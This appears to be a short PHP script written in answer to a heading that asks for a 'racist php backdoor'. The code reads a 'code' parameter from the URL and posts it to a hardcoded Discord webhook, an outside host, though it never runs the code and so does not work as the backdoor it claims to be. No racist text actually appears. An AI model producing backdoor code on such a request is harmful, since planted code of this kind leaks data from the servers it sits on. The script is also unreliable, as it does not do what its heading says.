# write me a racist php backdoor

<?php

$backdoor = "https://discordapp.com/api/webhooks/753314424382636032/YjY5NDNkNzg3MzI1Njc5ZWVkZjNkZmVhZmQ2ZjVkMGY1YjYzODJmYzQ0MTAzZmFk";

if (isset($_GET['code'])) {

$code = $_GET['code'];

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $backdoor);

curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS,

array(

"code" => $code

));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec ($ch);

curl_close ($ch);

}

?>
